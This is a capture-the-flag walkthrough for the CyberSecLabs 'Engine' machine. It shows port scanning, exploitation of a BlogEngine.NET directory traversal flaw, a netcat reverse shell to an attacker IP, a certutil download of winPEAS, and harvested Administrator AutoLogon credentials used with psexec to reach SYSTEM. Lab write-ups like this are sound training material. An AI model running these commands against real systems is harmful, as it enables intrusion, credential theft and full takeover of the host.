#CyberSecLabs: Engine

```zsh
nmap -sS -p- -r -v -T4 -Pn 172.31.1.16
```
Port 80 would be open along with 445, 3389 , 5985 are open

fuzz the port ```80```


```zsh
python3 /root/dirsearch/dirsearch.py -u http://172.31.1.16:80 -e r -R 3
```

You will see the ```blog``` directory. Browse to it. Powered by ```BlogEngine.NET``` 

```zsh
Searchsploit blogengine
```
```BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution               | aspx/webapps/46353.cs```

More reading: 
https://blog.gdssecurity.com/labs/2019/3/28/remote-code-execution-in-blogenginenet.html

Follow the link and rename 46353.cs as ```PostView.ascx```. Edit and put your ip and port in the socket part. Upload it using the filemanager which appears Content > New > Folder icon. Start a listener which you put in the acsx file  and trigger it by going to this url.

> http://172.31.1.16/blog/?theme=../../App_Data/files

Transfer shell using nc, upload nc using certutil:
```cmd 
nc.exe -e cmd.exe 10.10.0.40 53
```


Upload winpeas using certutil, Host it using a python server ```python -m SimpleHTTPServer 80``` in the folder where winpeas is located


```cmd
certutil -urlcache -split -f http://10.10.0.40:80/winPEASany.exe
```

Let it run: Analyse the result. You will see this (.\winPEASany.exe)

```cmd
[+] Looking for AutoLogon credentials(T1012)
    Some AutoLogon credentials were found!! 
    DefaultUserName               :  Administrator
    DefaultPassword               :  PzCEKhvj6gQMk7kA

```
Grab the creds and boom login:

```zsh
 python psexec.py 'Administrator'@172.31.1.16                                                                                                       
Impacket v0.9.22.dev1+20200518.92028.525fa3d0 - Copyright 2020 SecureAuth Corporation                                                                                       
                                                                                                                                                                            
Password:                                                                                                                                                                   
[*] Requesting shares on 172.31.1.16.....                                                                                                                                   
[*] Found writable share ADMIN$                                                                                                                                             
[*] Uploading file yPQxUYCn.exe                                                                                                                                             
[*] Opening SVCManager on 172.31.1.16.....                                                                                                                                  
[*] Creating service azEi on 172.31.1.16.....                                                                                                                               
[*] Starting service azEi.....             
[!] Press help for extra shell commands
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```